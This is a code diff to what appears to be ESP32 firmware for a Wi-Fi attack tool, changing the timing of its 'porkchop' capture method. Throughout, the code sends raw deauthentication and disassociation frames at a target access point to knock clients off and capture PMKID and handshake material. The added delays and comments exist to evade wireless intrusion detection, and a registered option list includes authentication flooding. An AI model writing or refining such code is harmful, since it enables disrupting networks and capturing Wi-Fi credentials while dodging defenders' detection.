@@ -284,7 +284,9 @@ void porkchop(const Ctx& ctx) {
                 for (uint8_t r = 0; r < rounds; r++) {
                     ctx.sendRawMgmt(0xC0, target.bssid, ctx.bcast);
                     if (ctx.jitterMs) delay(1 + (esp_random() % ctx.jitterMs));
+                    else             delay(WSLBypasser::burstLegGapMs());
                     ctx.sendRawMgmt(0xA0, target.bssid, ctx.bcast);
+                    if (r + 1 < rounds) delay(WSLBypasser::burstRoundGapMs());
                 }
                 *ctx.framesDeauth = (uint32_t)(*ctx.framesDeauth + (uint32_t)rounds * 2);
             }
@@ -361,16 +363,17 @@ void porkchop(const Ctx& ctx) {
         }
     } else {
         // No clients tracked yet - broadcast kick (still better than nothing).
-        // JITTER MS (RADIO menu): 0 = off (back-to-back frames, legacy
-        // behavior). A nonzero value spaces the pair by a random amount so
+        // JITTER MS (RADIO menu): 0 = off (fall back to the BURST pattern's
+        // own spacing). A nonzero value spaces the pair by a random amount so
         // a WIDS doesn't see two identical frames at zero spacing as an
         // obvious tool signature - same idea as the jitter already applied
-        // inside WSLBypasser::sendBidirectionalKick(), just user-tunable
-        // here since this fallback path calls sendRawMgmt() directly.
+        // inside sendBidirectionalKick().
         for (uint8_t r = 0; r < rounds; r++) {
             ctx.sendRawMgmt(0xC0, target.bssid, ctx.bcast);
             if (ctx.jitterMs) delay(1 + (esp_random() % ctx.jitterMs));
+            else             delay(WSLBypasser::burstLegGapMs());
             ctx.sendRawMgmt(0xA0, target.bssid, ctx.bcast);
+            if (r + 1 < rounds) delay(WSLBypasser::burstRoundGapMs());
         }
         *ctx.framesDeauth = (uint32_t)(*ctx.framesDeauth + (uint32_t)rounds * 2);
     }
@@ -382,7 +385,12 @@ void porkchop(const Ctx& ctx) {
     if (ctx.csaHerd) csaHerd(ctx);
 }
 
-CAP_METHOD_REGISTER("FOCUS", porkchop, pmkidProbePorkchop, resetPorkchopState)
+// RADIO→EDIT knobs this method actually reads from Ctx (0-terminated).
+// 9=KICK N 10=BIDIR 11=EAPOL TX 12=PMKID 13=CSA 14=AUTH FLOOD 15=REASON
+// 20=JITTER MS 21=COOLDOWN 22=SCORE THR 25=DATA ACT 26=STRICT LK 31=BURST
+static const uint8_t porkchopKnobs[] = {9, 10, 11, 12, 13, 14, 15, 20, 21, 22, 25, 26, 0};
+
+CAP_METHOD_REGISTER("FOCUS", porkchop, pmkidProbePorkchop, resetPorkchopState, porkchopKnobs)
 
 } // namespace Methods
 } // namespace Cap
